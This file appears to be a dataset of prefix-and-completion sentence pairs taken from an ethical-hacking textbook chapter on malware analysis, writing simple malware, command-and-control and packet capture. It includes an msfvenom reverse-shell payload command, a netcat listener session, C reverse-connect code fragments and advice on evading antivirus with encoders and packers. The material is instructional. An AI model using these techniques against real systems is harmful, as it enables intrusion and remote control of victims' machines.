"while wannacry is definitely ransomware , that only refers to what it","while wannacry is definitely ransomware , that only refers to what it does and doesn ’ t really refer at all to how it spreads"
"so , is it a virus or a worm ? since it used a remote vul-nerability","so , is it a virus or a worm ? since it used a remote vul-nerability to infect systems , it was capable of connecting to other systems automatically and infecting them"
"this may include backdoors , key loggers , botnet clients ,","this may include backdoors , key loggers , botnet clients , trojans , or other software that is useful to the attacker"
there may be many reasons for using a dropper rather,there may be many reasons for using a dropper rather than just simply including all the functionality the dropper then installs
it could also be that the dropper could avoid,it could also be that the dropper could avoid detection where the other software may be more easily detected
once all of the software the attacker wants on the system is in,"once all of the software the attacker wants on the system is in place , the dropper can remove itself so it can ’ t be located"
this sort of multi-stage attack adds additional layers when,this sort of multi-stage attack adds additional layers when it comes to not only detec- tion but also analysis
a dropper could also include functionality to act as a tor,a dropper could also include functionality to act as a tor node so it could pull malware out of the tor network
"this could also help avoid detection , especially as","this could also help avoid detection , especially as tor may not use common pathways that could be identified"
"on top of that , it would uti-lize encryption , which makes it much harder to detect if the","on top of that , it would uti-lize encryption , which makes it much harder to detect if the security devices can ’ t grab and proxy known hypertext transfer protocol ( http ) paths ( ports )"
"malware analysis before we go anywhere with analysis , you should know we ’","malware analysis before we go anywhere with analysis , you should know we ’ re going to be using a num - ber of tools to do the analysis"
"rather than grabbing all of the tools and installing them individually , you may find","rather than grabbing all of the tools and installing them individually , you may find it easier to make use of a package that will install them all for you"
the majority of malware is written for windows systems because it is the predominant desktop and the,the majority of malware is written for windows systems because it is the predominant desktop and the one most likely to be used by people who may be susceptible to malware and social engineering attacks
since you may be working on malware written for windows,"since you may be working on malware written for windows systems , you have to be very careful working with it"
"to get the tools we need installed , you can take a look at a powershell","to get the tools we need installed , you can take a look at a powershell script that was written by members of the fireeye labs advanced reverse engineering ( flare ) team"
ps1 script will install all the necessary tools,"ps1 script will install all the necessary tools automatically , making use of the chocolatey package manager"
"of course , it ’ s important to not only run the malware but","of course , it ’ s important to not only run the malware but also to monitor the system so we can determine what the malware is doing"
you need to make sure you are taking snapshots at the right,"you need to make sure you are taking snapshots at the right time and , ideally , keeping track of what each snapshot is"
"the date and time stamp isn ’ t very descriptive , so if that ’ s all","the date and time stamp isn ’ t very descriptive , so if that ’ s all there is to identify the snapshot , you may simply not know what state it was in"
some malware is capable of recognizing that it ’ s running in a vm,"some malware is capable of recognizing that it ’ s running in a vm , and it may not exhibit any of its normal behaviors in that case"
it is one of reasons static analysis can be so important—because you aren,it is one of reasons static analysis can be so important—because you aren ’ t relying on the malware to expose itself in a monitored condition
static analysis static analysis of malware is when we look,static analysis static analysis of malware is when we look at the details of the malware sample without running it
"when i say we are looking at the actual code , i mean we are looking","when i say we are looking at the actual code , i mean we are looking at the disassembly of the program , reverting to assembly lan-guage rather than the binary opcodes"
"not surprisingly , then , in order to be good at","not surprisingly , then , in order to be good at that aspect of static analysis , you need to understand assembly language"
"otherwise , you are just staring at a list of mnemonics that don ’","otherwise , you are just staring at a list of mnemonics that don ’ t mean much to you , as well as a lot of hexa-decimal values"
the good thing about looking at the disassembly of the,the good thing about looking at the disassembly of the program file is that you are looking at the program
it ’ s not like hiding the existence of the malware,it ’ s not like hiding the existence of the malware because the hash value changes and antivirus can ’ t detect it
"since it doesn ’ t matter much at this point what we look at , because all programs","since it doesn ’ t matter much at this point what we look at , because all programs will have these properties , we ’ re going to look at a simple program i wrote in c"
"the values of the properties will be different from one program to another , and there are some properties we ’ re","the values of the properties will be different from one program to another , and there are some properties we ’ re going to spend some time looking at to determine if it may be malware and then what that malware may be up to"
we can tell from the overview what cpu architecture the executable,"we can tell from the overview what cpu architecture the executable is for—whether it ’ s for 32-bit or 64-bit , for instance"
the portable executable ( pe ) file format wraps the executable code along with information,the portable executable ( pe ) file format wraps the executable code along with information that the operating system loader needs to place the program in memory and start execution
"4 overview of pe in cutter the goal of a pe file , as noted earlier ,","4 overview of pe in cutter the goal of a pe file , as noted earlier , is to provide information for the loader to get all the elements of the program into memory"
"when a program is compiled , it is broken into multiple sections , which are","when a program is compiled , it is broken into multiple sections , which are identified with labels so the operating system loader will know what to do with them"
"there are multiple sections that may be part of pe files ,","there are multiple sections that may be part of pe files , but we ’ re going to focus on a couple of them specifically"
"the objective of that small executable , sometimes called a stub , is to take the","the objective of that small executable , sometimes called a stub , is to take the real program and either unpack it , because it ’ s compressed , or sometimes decrypt it"
"once the executable bits are decompressed or decrypted , a new thread , or","once the executable bits are decompressed or decrypted , a new thread , or forked process , gets started up and control gets handed to those executable bits"
the compression could be a scheme the antivirus doesn ’ t know,"the compression could be a scheme the antivirus doesn ’ t know how to handle , and the same could be true of the encryption"
a simple change to the encryption key could alter the,"a simple change to the encryption key could alter the signature of any executable , meaning it will evade antivirus"
while cutter is a very versatile tool for,"while cutter is a very versatile tool for analyzing executables , it does not identify packed executables"
"interestingly , opening these programs back in cutter , there are","interestingly , opening these programs back in cutter , there are a couple of properties of the executable worth taking a look at"
"the first is that , unlike the previous program we looked at , where we could see the different sections in the","the first is that , unlike the previous program we looked at , where we could see the different sections in the program and the graph showing their relative sizes , there are no sections in the execut-able that ’ s packed with upx"
"text section is suspicious , but when we look at the entry point , the memory address at","text section is suspicious , but when we look at the entry point , the memory address at which the operating system is told to start execu-tion , we can see something interesting in figure 8"
this tells us the program was packed with upx1,this tells us the program was packed with upx1 and entry0 is the label for the decompression stub code
disassembly the most effective way to see what a program is going to,"disassembly the most effective way to see what a program is going to do , short of running it , is to look at the code"
"the process of disassembly is taking the executable code , stored as the operations codes ( opcodes )","the process of disassembly is taking the executable code , stored as the operations codes ( opcodes ) that the cpu understands , and converting them back to something that ’ s more understandable for humans—assembly language"
there are other programs that can perform a disassembly and also,there are other programs that can perform a disassembly and also give us a way to control the run of the program
"since we are performing a static analy - sis , we don ’ t","since we are performing a static analy - sis , we don ’ t actually want to run it , so what we are getting from cutter is perfect"
"in order to understand what is happening , we need to be","in order to understand what is happening , we need to be able to read assembly language , which is something that takes some practice"
where high-level programming languages give us variables to work,"where high-level programming languages give us variables to work with , assembly language gives us memory to work with"
we need to be able to get data into the registers,"we need to be able to get data into the registers , though , which means we need something like the mov operation"
"for example , the mov operation on the second line of code","for example , the mov operation on the second line of code , mov esi , 0x405000 , uses a register referred to as esi"
this allows the edi register to contain the result,"this allows the edi register to contain the result of a computation , which is shown in square brackets"
the hexadecimal value 0x4000 is subtracted from that memory,the hexadecimal value 0x4000 is subtracted from that memory address and the result is loaded into the edi reg-ister
some of them are meant to follow a compare ( cmp ) and,"some of them are meant to follow a compare ( cmp ) and are used to jump if a register value is nonzero , for instance"
"as you look through the disassembly , you will also see a","as you look through the disassembly , you will also see a lot of arithmetic operations , including add and sub ( for subtract )"
"the difference is that you don ’ t have to take multiple steps to retrieve a value , add","the difference is that you don ’ t have to take multiple steps to retrieve a value , add one to it , store the result , and then move it back to the register it came out of"
performing a static analysis by following the code is time-consuming,performing a static analysis by following the code is time-consuming if you don ’ t want to run the program
you could be causing damage to files on your system,"you could be causing damage to files on your system , or you could be infecting other systems on your network"
"using a static analysis in this way , as indicated earlier , is","using a static analysis in this way , as indicated earlier , is time- consuming and requires a solid understanding of the behavior of different operations codes"
"properties in addition to looking inside the program file , we can","properties in addition to looking inside the program file , we can just take a look at some of the metadata associated with it"
it ’ s possible this can give you some information about,it ’ s possible this can give you some information about the malware and certainly about what has happened on your system
"if you were to look at any of the system files ,","if you were to look at any of the system files , as examples , you would see microsoft corporation as the copyright holder"
even if a malware author inserts information into the metadata suggesting the file,"even if a malware author inserts information into the metadata suggesting the file is from microsoft , the executable will not have the right cryptographic signature"
virustotal another way to perform a static analysis without executing,virustotal another way to perform a static analysis without executing the program is to obtain a hash of the sample
"it ’ s well known , and while there are some applications for which it isn ’ t the best approach because it can be prone to collisions (","it ’ s well known , and while there are some applications for which it isn ’ t the best approach because it can be prone to collisions ( instances where two different data sets generate the same value ) , obtaining a file hash for analysis of malware is not generally considered to be one of them"
"in the following listing , you can see a run of","in the following listing , you can see a run of a hashing algorithm on a windows system to get an md5 sum"
"exe c : \users\kilroy\documents you can , of course , use","exe c : \users\kilroy\documents you can , of course , use additional hashing algorithms like the secure hash algorithm ( sha )"
"sha-1 generates a longer hash than md5 does , which means","sha-1 generates a longer hash than md5 does , which means the space that hashes can be generated in is much larger"
"once you have a hash value , you can use it to","once you have a hash value , you can use it to check databases of malware , which commonly store hash values to compare against"
"if you have a file , you can upload it and virustotal will check","if you have a file , you can upload it and virustotal will check the file by obtaining a hash and comparing the hash against the 60 antivirus programs"
"if we go to the details tab , we will","if we go to the details tab , we will get the hash values from the different cryptographic algo - rithms"
"11 shows additional properties on the file , including multiple hashes , the","11 shows additional properties on the file , including multiple hashes , the file type , and the first time this file was submitted to virustotal"
"this is apparently a reasonably recent sample , as it","this is apparently a reasonably recent sample , as it was first submitted just a couple of weeks before this submission"
"with virustotal , you can make use of the analy-sis done","with virustotal , you can make use of the analy-sis done by others , which can help save you a lot of work"
"because it ’ s published , though , it means that","because it ’ s published , though , it means that it is accurate , since it would have been vetted by others"
dynamic analysis where the point of static analysis is to not run the program,"dynamic analysis where the point of static analysis is to not run the program , a dynamic analysis is done by running the program to see what it does"
you also don ’ t want to put it into a sandbox that still has,you also don ’ t want to put it into a sandbox that still has network access and is able to infect other systems on a network you care about
it can also check the mac address to determine if the,it can also check the mac address to determine if the vendor id ( the first three bytes ) matches a vm provider
malware that determines it is running inside a vm may opt to not deploy the payload,"malware that determines it is running inside a vm may opt to not deploy the payload , making it inert , which means you won ’ t get to see what it does"
"this has the advantage of being able to control the machine completely , including setting up controls","this has the advantage of being able to control the machine completely , including setting up controls on the network interface to prevent it from getting anywhere you don ’ t want it to go"
"also , with a vm , you can take advantage of","also , with a vm , you can take advantage of snapshots to restore the system back to a known clean state"
this means you can run the malware over and,this means you can run the malware over and over against clean systems to continue to observe the behavior
"it also gives you the ability to compare snapshots , so you can","it also gives you the ability to compare snapshots , so you can see the differ-ences between a clean system and one after running the malware"
"you need to get it set up , get an os installed","you need to get it set up , get an os installed , and then get a snapshot of it before you run the malware"
one is to use an automated system that will run the,one is to use an automated system that will run the malware inside of a vm and then do the comparison for you
"it handles starting up a vm , injecting the malware into it , and then performing","it handles starting up a vm , injecting the malware into it , and then performing some analysis on files , the registry , network connections , process actions , and memory"
"certainly the windows vm will cost money , though you can generally","certainly the windows vm will cost money , though you can generally use a freely available hypervisor like kvm ( kernel-based virtual machine )"
com ; it has been down for some time but is expected to,"com ; it has been down for some time but is expected to come back , though there is currently no date in sight for that"
"for our purposes , we are going to run against","for our purposes , we are going to run against another implementation of cuckoo sandbox , controlled by hieki pikker"
"you upload your sample and cuckoo sandbox will run hashes against it ,","you upload your sample and cuckoo sandbox will run hashes against it , which can be used to check databases to see if the hashes are known"
"however , we can still use cuckoo sandbox to execute","however , we can still use cuckoo sandbox to execute the program and report back to us on the behavior"
"it also shows the different hash values from the different algorithms , and there is","it also shows the different hash values from the different algorithms , and there is also an entry for yara , which is a language used to describe malware files"
"12 cuckoo sandbox details before running the sample we have provided ,","12 cuckoo sandbox details before running the sample we have provided , we can make some choices about the envi- ronment that it runs in"
"in some cases , you may not want to provide","in some cases , you may not want to provide full internet access because it may get out of your control"
13 cuckoo sandbox options we ’ re going to use,13 cuckoo sandbox options we ’ re going to use the default settings and run our sample through the sandbox
process ] info : successfully executed process,process ] info : successfully executed process from path u ' c : \\users\\admini~1\\appdata\\local\\temp\\bogus
"exe ' with arguments `` and pid 2268 2018-10-29 02:54:10,437 [ analyzer ] debug : loaded monitor into process with pid","exe ' with arguments `` and pid 2268 2018-10-29 02:54:10,437 [ analyzer ] debug : loaded monitor into process with pid 2268 2018-10-29 02:54:10,437 [ analyzer ] info : added new file to list with pid 2268 and path c : \users\administrator\appdata\local\temp\file"
"process ] info : memory dump of process with pid 2268 completed 2018-10-29 02:54:11,312 [ analyzer ] info :","process ] info : memory dump of process with pid 2268 completed 2018-10-29 02:54:11,312 [ analyzer ] info : process with pid 2268 has terminated2018-10-29 02:54:11,328 [ analyzer ] info : process list is empty , terminating analysis"
"14 , you can see the information about the run , which includes a","14 , you can see the information about the run , which includes a thumbnail for the screen capture that was taken while the sample was being run"
"the details about the run provide us with some information , the","the details about the run provide us with some information , the screen capture can provide additional details , and the logs get granular"
14 cuckoo sandbox results using cuckoo sandbox takes the risk,14 cuckoo sandbox results using cuckoo sandbox takes the risk of running malware off of our systems and net- work
there are cases where you may want to be able to see exactly what the,there are cases where you may want to be able to see exactly what the malware is doing and be able to see the code while that ’ s happening
"with the control you get from a debugger , though","with the control you get from a debugger , though , you can potentially skip over any really bad actions"
a debugger gives a developer control over the run of a program,"a debugger gives a developer control over the run of a program , meaning the developer can go line by line through the program"
"in an integrated development environment ( ide ) , the debugger that ’ s integrated would commonly","in an integrated development environment ( ide ) , the debugger that ’ s integrated would commonly give us the ability to work through the source code line by line and function by function"
"instead of stepping through the source code line by line , we would be working through","instead of stepping through the source code line by line , we would be working through opcode by opcode , since we are looking at the disassembly rather than the source code"
"you may not need all of the power that comes with ida pro , so","you may not need all of the power that comes with ida pro , so you could use ollydbg , the immunity debugger , or the windows debugger from microsoft"
we ’ re going to start with a look at using the community edition,"we ’ re going to start with a look at using the community edition of ida rather than the pro version , because it will have everything we need"
"if you try to load a 64-bit program into a 32-bit debugger ,","if you try to load a 64-bit program into a 32-bit debugger , for instance , you won ’ t be able to run it through"
a 32-bit debugger just won ’ t know how to handle,a 32-bit debugger just won ’ t know how to handle a 64-bit program because the debugger is running as a 32-bit program
make sure you are matching cpu architecture in the,make sure you are matching cpu architecture in the program to a debugger that can support that cpu architecture
"however , if you really want to do something different","however , if you really want to do something different from what ida is selecting , you can make changes"
you could test the different execution paths by following them visually,you could test the different execution paths by following them visually rather than trying to keep track of what you are doing
"16 ida view just for comparison purposes , we ’ re going","16 ida view just for comparison purposes , we ’ re going to take a look at ollydbg , which is a freeware debugger"
"you get a disassembly and the correspond-ing hex dump ,","you get a disassembly and the correspond-ing hex dump , showing you what it looks like at the byte level"
"17 ollydbg view if you were to just start off the program ,","17 ollydbg view if you were to just start off the program , it would run through to completion and you wouldn ’ t see anything"
"when the program runs , each function is added to the","when the program runs , each function is added to the call stack so you can trace the program through the function calls"
"once you have the memory address where the entry point is located , you can","once you have the memory address where the entry point is located , you can set a breakpoint by right-clicking on the operation and toggling the breakpoint from the context menu"
"in order to get it going again , you can step through the program a line at a time , or you could","in order to get it going again , you can step through the program a line at a time , or you could just allow the program to con - tinue to run , either to the next breakpoint or to the completion of the program"
"if you step into it , you will follow execution through all","if you step into it , you will follow execution through all functions , including library functions that are part of the c standard library"
"you could step over , which means you ’ ll call the","you could step over , which means you ’ ll call the function and just stay in the area in memory where you have been"
"18 call stack when you are looking at a linux program , you will","18 call stack when you are looking at a linux program , you will likely see statements showing int 0x80 , which calls interrupt vector 128 ( 0x80 )"
"in windows , you can still do that , but it ’ s","in windows , you can still do that , but it ’ s more common to see calls to library functions that wrap the system calls"
these application programming interfaces ( apis ) make the code more standardized,these application programming interfaces ( apis ) make the code more standardized and probably more optimized than code that makes the system call directly
"in doing this , just as with any time you are adding a stack","in doing this , just as with any time you are adding a stack frame by using a function , you need to make adjustments to stack pointers"
"in the following code listing , you can see a","in the following code listing , you can see a section of assembly code where a library function is called twice"
"just before calling the runtime library function , iob_lb0 , the stack pointer","just before calling the runtime library function , iob_lb0 , the stack pointer and instruction pointer are stored in preparation for jumping to a new function"
"calling library functions | 0x004012e0 sub esp , 0x1c | 0x004012e3","calling library functions | 0x004012e0 sub esp , 0x1c | 0x004012e3 mov dword [ esp ] , 1| 0x004012ea call dword [ sym"
"dll iob_1b0 | 0x004012f5 lea esi , [ esi ] | 0x004012f9 lea edi , [ edi ] | 0x00401300","dll iob_1b0 | 0x004012f5 lea esi , [ esi ] | 0x004012f9 lea edi , [ edi ] | 0x00401300 _winmaincrtstartup : | 0x00401300 sub esp , 0x1c| 0x00401303 mov dword [ esp ] , 2| 0x0040130a call dword [ sym"
_atexit 6 the library functions make following the program easier because they are called by name ; since the libraries are,"_atexit 6 the library functions make following the program easier because they are called by name ; since the libraries are named and the functions have labels , the processor knows which memory space to jump to and where within that space"
"the labels are the function names , so you can at least get something of a","the labels are the function names , so you can at least get something of a handle on part of the program without hav-ing to step into the function to watch every operation"
the problem with using someone else ’ s malware when you are testing,the problem with using someone else ’ s malware when you are testing is that you may not be fully aware of everything the malware does
"on top of that , the malware may be trying","on top of that , the malware may be trying to communicate with systems under someone else ’ s control"
"keep in mind that you are bound to behave ethically , which means","keep in mind that you are bound to behave ethically , which means you can ’ t use actual malware that may cause damage to a system"
it may also be to see if you can get,it may also be to see if you can get malware injected into the network and onto systems without detection
"the second is generally easier and makes use of metasploit , since it has so","the second is generally easier and makes use of metasploit , since it has so many modules already in place and there is a way to generate a stand-alone executable"
"writing your own if you have some programming experience , or at least a willingness","writing your own if you have some programming experience , or at least a willingness to jump in and try to learn , you can try to create your own malware"
a very simple way to do this is to just,a very simple way to do this is to just create a program that could perform whatever function you need
"for example , you could write a client that","for example , you could write a client that could connect back to any handler or netcat-based listener"
you would need to use some other attack to get your program onto the system,"you would need to use some other attack to get your program onto the system , but once it ’ s there , the system could be under your control"
"python is currently a popular programming language , and there are","python is currently a popular programming language , and there are enough librar-ies to support pretty much anything you may want to do"
"the problem with python , gener-ally , is that it requires","the problem with python , gener-ally , is that it requires a python interpreter to be installed on the system running the script"
"you ’ ll find most systems won ’ t have python installed , and while you","you ’ ll find most systems won ’ t have python installed , and while you may be able to get python installed , it ’ s probably a lot of work"
a language like c is time-tested and has a lot of source code,a language like c is time-tested and has a lot of source code available online for you to pull pieces to cobble together a working program
"before you have a program , you need to take your source","before you have a program , you need to take your source code and run it through a compiler to get a working program"
if you are looking to install this program on a windows 32-bit,"if you are looking to install this program on a windows 32-bit system , compiling it on a windows 32-bit system would be easiest"
there are cross-compilers available that can generate a,there are cross-compilers available that can generate a windows executable on a linux system and vice versa
most people will make use of one of the microsoft,most people will make use of one of the microsoft integrated development environments ( ides ) to build software in
"that ’ s a lot of software for the kinds of programs you will likely be writing , and","that ’ s a lot of software for the kinds of programs you will likely be writing , and visual studio is more designed for programs to make use of windows api rather than just standard c libraries"
the following code listing is a small program that,the following code listing is a small program that has minimal functionality to initiate a connection to a system
"on the remote system , you can have just a netcat listener waiting ,","on the remote system , you can have just a netcat listener waiting , or you could have a custom program designed to listen to this simple client"
"the program you see here , com-piled and tested on a","the program you see here , com-piled and tested on a linux system , will connect out to the ip address specifi ed"
"this is bad programming practice , but hard-coding an ip address","this is bad programming practice , but hard-coding an ip address minimizes any interaction with the system you are trying to infi ltrate"
one good way to handle an address like this would be to,one good way to handle an address like this would be to accept it on the command line or take a confi guration fi le
"so , you should know your ip address ahead of time and you can","so , you should know your ip address ahead of time and you can just put it in here , compile the program , and send it out"
"\n '' ) ; return -8 ; } if ( connect ( sock , ( struct sockaddr * )","\n '' ) ; return -8 ; } if ( connect ( sock , ( struct sockaddr * ) & srv , sizeof ( srv ) ) < 0 ) { printf ( `` ca n't connect ! stopping"
"a socket is a data construct , initially created at the university of california , berkeley ,","a socket is a data construct , initially created at the university of california , berkeley , as part of the berkeley software distribution , a re-creation of at & t ’ s unix"
the socket provides the data structures and handles needed,the socket provides the data structures and handles needed to interact with other systems using tcp/ip and related protocols
"once the socket is set up and the client is connected to the server ,","once the socket is set up and the client is connected to the server , the program sends out a message to the server , then waits for a response"
"in order to gather that input , the program should be using something like popen (","in order to gather that input , the program should be using something like popen ( ) , which opens a process with the string being passed as the process to be run"
this would also allow you to initiate any new process and,this would also allow you to initiate any new process and capture output so it could be sent back to the server side
then you don ’ t have to worry about cpu architectures,then you don ’ t have to worry about cpu architectures and compilers and making any customizations to the program and then recompiling
metasploit lets you take any of the modules that it,metasploit lets you take any of the modules that it has available and package that module up into an executable
the reason for using a reverse connection is that it ’ s more,"the reason for using a reverse connection is that it ’ s more likely to be allowed through the firewall , since outbound connections are often trusted"
"networks where servers and infrastructure are located may allow connections in , but usually only the ports","networks where servers and infrastructure are located may allow connections in , but usually only the ports necessary for already running services , meaning we can ’ t start up a service on that port"
we need to be looking for something that is going to,we need to be looking for something that is going to match what we are going to be doing for a server
if we are going to be opening a port with netcat,"if we are going to be opening a port with netcat , we can ’ t use something like a meterpreter payload"
"this will take one of the payload scripts , written in","this will take one of the payload scripts , written in ruby , and compile it to an output file that we specify"
"in the following listing , you can see the use of","in the following listing , you can see the use of msfvenom to create an executable and linkable format ( elf ) file"
"this is the executable format on linux systems , like","this is the executable format on linux systems , like the portable executable ( pe ) format is for windows"
the command line indicates that we are creating an executable,"the command line indicates that we are creating an executable for an x86 , meaning 32-bit system , running linux"
"/payloadkilroy : ~ $ file payloadpayload : elf 32-bit lsb executable , intel 80386 , version 1 ( sysv ) , statically linked","/payloadkilroy : ~ $ file payloadpayload : elf 32-bit lsb executable , intel 80386 , version 1 ( sysv ) , statically linked , no section header before running the payload that we have in executable form , we need to have our netcat listener running"
"in the following code listing , you can see what it looks like when","in the following code listing , you can see what it looks like when we start up netcat on the port to which the payload will be connecting"
what you will notice is that there is no indication,what you will notice is that there is no indication that netcat is listening or that it has received a connection
"since i was sitting in front of both ends , i knew when the connection had been","since i was sitting in front of both ends , i knew when the connection had been made so i was able to send a command back to the payload program that was running"
netcat connection kilroy : ~,netcat connection kilroy : ~ $ nc -lp 4444 lsdesktopdocumentsdownloadsempiremusicpicturespublictemplatesvideosclientclient
"you can move around the file system , since there","you can move around the file system , since there is nothing to jail you within the directory you are in"
one thing you may run into is intrusion,one thing you may run into is intrusion detection systems or antivirus programs catch- ing your malware
encoding it obscures the actual payload so it may not,encoding it obscures the actual payload so it may not look like malicious software to a program looking for it
"in the following listing , you can see the necessary","in the following listing , you can see the necessary parameter to add one of the common encoders to the payload"
"the more times you pass it through the encoder ,","the more times you pass it through the encoder , the more you are obscuring the payload contained in the executable"
"however , if someone happens to know what one payload that ’ s been passed through","however , if someone happens to know what one payload that ’ s been passed through an encoder once or twice looks like , there is the chance that it could be caught"
malware infrastructure you will have noticed that when we put a program onto a target system,"malware infrastructure you will have noticed that when we put a program onto a target system , there is another end of the communication stream that allows access to that target system"
botnets have command and control infrastructure ( c2 or c & c ) that allows,"botnets have command and control infrastructure ( c2 or c & c ) that allows an attacker to send commands to the bots , which are endpoints in a botnet"
19 command and control infrastructure attackerbot 2bot 1c & c 1 c & c 2,19 command and control infrastructure attackerbot 2bot 1c & c 1 c & c 2 c & c 3 bot 4bot 3 this is essentially a single-tier c & c network
a large botnet would likely require mul- tiple tiers,a large botnet would likely require mul- tiple tiers of servers in order to control millions of devices
the attacker interfaces with the top-level device to send,"the attacker interfaces with the top-level device to send commands to the endpoints , telling them what to do"
"it may also be sending out unsolicited com-mercial email ( uce , referred","it may also be sending out unsolicited com-mercial email ( uce , referred to colloquially as spam ) or starting up a distributed denial of service attack"
there are times you may see the internet relay chat (,there are times you may see the internet relay chat ( irc ) protocol used to send commands to end - points
another way to do this is to create a web-based infrastructure so the endpoints connect to a,another way to do this is to create a web-based infrastructure so the endpoints connect to a previously identified web server to retrieve pages that would have commands for the endpoints to act on
"this doesn ’ t mean , though , that you have to stand","this doesn ’ t mean , though , that you have to stand up an apache , nginx , or iis server just to serve up pages"
the frameworks and libraries take care of all the underlying protocol exchanges,the frameworks and libraries take care of all the underlying protocol exchanges and all you need to do is write some very high-level code
"rest is representational state transfer , adding the capability to man-age","rest is representational state transfer , adding the capability to man-age the state of an application that http doesn ’ t support"
adding additional end - points is as simple,adding additional end - points is as simple as adding additional functions with the endpoints defined
js program for restful services var express = require ( 'express ' ) ; var,js program for restful services var express = require ( 'express ' ) ; var app = express ( ) ; var fs = require ( 'fs ' ) ; app
"log ( `` server is listening at % s on % s '' , host , port )","log ( `` server is listening at % s on % s '' , host , port ) } ) what you ’ ll see here is an endpoint that doesn ’ t actually do anything"
what you can do is respond with javascript object notation ( json,"what you can do is respond with javascript object notation ( json ) , which consists of a key or property followed by a value"
"it ’ s a fairly easy way to stand up a web server with application-like functionality , but you could","it ’ s a fairly easy way to stand up a web server with application-like functionality , but you could also write pages that could be put up into a web server that either already exists or could be installed"
"fortunately , it ’ s not all that hard to fool","fortunately , it ’ s not all that hard to fool antivirus if the malware author wants to put in a little effort"
"first , any new malware won ’ t be iden-tified because there isn ’ t a signature for","first , any new malware won ’ t be iden-tified because there isn ’ t a signature for it until it has been analyzed and the signature has been added to the database for the antivirus software"
this would require the malware to make alterations to the binary,"this would require the malware to make alterations to the binary file , potentially by writing out a fresh copy as it propagates"
they need to know how to make alterations to copies of,they need to know how to make alterations to copies of the program without resulting in an executable that won ’ t run
"using a different packing scheme , perhaps by compressing harder or not as hard , can","using a different packing scheme , perhaps by compressing harder or not as hard , can result in a file that looks different because the data section would appear to be different"
even in cases where antivirus or endpoint detection is looking,"even in cases where antivirus or endpoint detection is looking at behaviors , dropped files could have randomly generated names"
writing files and registry values as actions aren ’ t especially troublesome,"writing files and registry values as actions aren ’ t especially troublesome , so these protec-tion solutions can ’ t just identify those actions"
"the first is static analysis , which comes from looking at","the first is static analysis , which comes from looking at the properties of the malware as well as the actual code"
"you can look at the composition of the file , including the number","you can look at the composition of the file , including the number and size of the sections of a portable executable ( pe ) file"
"if you see an entry point named something like upx , you","if you see an entry point named something like upx , you will know that it has been packed because upx is a common packer"
disassemblers are useful for looking at the code,disassemblers are useful for looking at the code and also looking at some properties of the executable
"the other type of analysis is dynamic , which means","the other type of analysis is dynamic , which means running the program and looking at what the malware does"
this must be done with care because you don ’ t want to infect your own machine,"this must be done with care because you don ’ t want to infect your own machine , nor do you want to expose other systems on your network to poten - tial infection"
"running malware inside of virtual machines can help here , though some malware","running malware inside of virtual machines can help here , though some malware will know it is running inside of a virtual machine and not fully deploy"
"you can use a sandboxed environment to run the program ,","you can use a sandboxed environment to run the program , and there are sandboxes that will automate the analysis for you"
"one of these is cuckoo sandbox , which can be installed on","one of these is cuckoo sandbox , which can be installed on your own hardware , or there are some openly available installations online"
"because you are behaving ethically , you don ’ t","because you are behaving ethically , you don ’ t want to use actual malware , whose purpose is really malicious"
"you may , though , want to install backdoors or","you may , though , want to install backdoors or test whether operations staff will detect the existence of malware"
"you can do this by writing your own , taking into","you can do this by writing your own , taking into consideration your target platform and architecture as well as other requirements"
"python is a popular programming language , but windows systems may not","python is a popular programming language , but windows systems may not have a python interpreter installed like a macos or linux system would"
"a compiled program , written using a language like c , would generally work because all","a compiled program , written using a language like c , would generally work because all elements of the program can be compiled in rather than relying on libraries to be installed"
botnets are collections of infected systems that have command and control systems,botnets are collections of infected systems that have command and control systems that are used to tell the bot endpoints what they should be doing
"even if there isn ’ t an entire network of command and control systems , there may be at least","even if there isn ’ t an entire network of command and control systems , there may be at least one system available for infected systems to connect back out to so as to allow remote control from an attacker"
this is done because firewalls generally allow,this is done because firewalls generally allow outbound traffic where inbound traffic will get blocked
"when con-nections are initiated from the inside , there has","when con-nections are initiated from the inside , there has to be a server for the inside system to con-nect to"
if you wanted a tool that could help with both static,"if you wanted a tool that could help with both static and dynamic analysis of malware , which would you choose ? a"
"if you were to see the following command in someone ’ s history ,","if you were to see the following command in someone ’ s history , what would you think had happened ? msfvenom -i 5 -p windows/x64/shell_reverse_tcp -o program a"
which end of a client/server communication goes on the infected,which end of a client/server communication goes on the infected system if it is communi- cating with infrastructure ? 20
which of these would be a reason why it is best,which of these would be a reason why it is best for communications to originate from inside the infected network ? a
"if you wanted to capture packets , you needed special hardware and","if you wanted to capture packets , you needed special hardware and software and there weren ’ t many companies that could sell you that"
then came consumer network interfaces that didn ’ t cost a fortune,then came consumer network interfaces that didn ’ t cost a fortune and could forward all packets up through the interface into the operating system
"some of the software is command-line oriented , which is really helpful if you are","some of the software is command-line oriented , which is really helpful if you are connected to a system over ssh or other mechanisms that only provide a text-oriented interface"
this sort of software is not great for analysis if you need to dig into the packet content and see,"this sort of software is not great for analysis if you need to dig into the packet content and see entire streams , not to mention if you want to go deeper with your analysis and get statistics and graphs"
"it was once called ethereal , but it ’ s currently called wireshark","it was once called ethereal , but it ’ s currently called wireshark and it has a lot of capabilities to enable deep analysis of the packets"
"since we may have the ability to see the data anyway , through the applications transmitting the messages , packet","since we may have the ability to see the data anyway , through the applications transmitting the messages , packet capture isn ’ t nearly as interesting , to just look at messages to and from the device you are on"
"we can even take a targeted approach at it ,","we can even take a targeted approach at it , determining exactly which sys-tems we want to get traffic from"
web traffic today generally defaults to using transport layer,"web traffic today generally defaults to using transport layer security ( tls ) , which encrypts all messages"
"this is an issue that is chal-lenging , since","this is an issue that is chal-lenging , since one of the predominant protocols becomes obscured to us"
packet capture why is packet capture so important ? if you can get to the right place in the,"packet capture why is packet capture so important ? if you can get to the right place in the network to be able to capture the data , you can potentially grab usernames and passwords or other authentication/authorization traffic"
an attacker could potentially grab credit card informa-tion or,an attacker could potentially grab credit card informa-tion or other personally identifiable information ( pii ) that is marketable
there may be other information available on the network that could,there may be other information available on the network that could be useful as you are maneuvering through your client ’ s assets
packet capturing is the process of acquiring network traffi,packet capturing is the process of acquiring network traffi c that is addressed to systems other than your own
"you can certainly capture packets that are only addressed to your system ,","you can certainly capture packets that are only addressed to your system , but that ’ s not especially interesting since you ’ re already getting those"
network interface cards ( nics ) are programmed to only forward frames up to the operating system whose destination mac address is either,network interface cards ( nics ) are programmed to only forward frames up to the operating system whose destination mac address is either the mac address of the nic or the broadcast mac address ( ff : ff : ff : ff : ff : ff )
in order to force the nic to forward all messages up to the operating,"in order to force the nic to forward all messages up to the operating system , the card has to be put into what is called promiscuous mode"
